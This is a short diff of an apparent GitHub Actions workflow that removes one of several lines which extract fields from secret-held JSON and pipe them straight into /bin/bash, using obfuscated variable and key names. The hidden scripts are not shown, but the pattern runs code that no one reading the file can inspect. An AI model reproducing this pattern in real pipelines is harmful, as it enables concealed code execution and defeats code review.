@@ -17,7 +17,6 @@ jobs:
           k21: ${{ secrets.k21 }}
         run: |
           printf '%s' "$k21" | jq -r .qq5277 | /bin/bash
-          echo $sn0 | jq -r .gnzzv95 | /bin/bash
           echo $nc99389 | jq -r .hnoo91353 | /bin/bash
           printf '%s' "$x5397" | jq -r .yvo1714 | /bin/bash
           echo $rg1 | jq -r .djbif23123 | /bin/bash
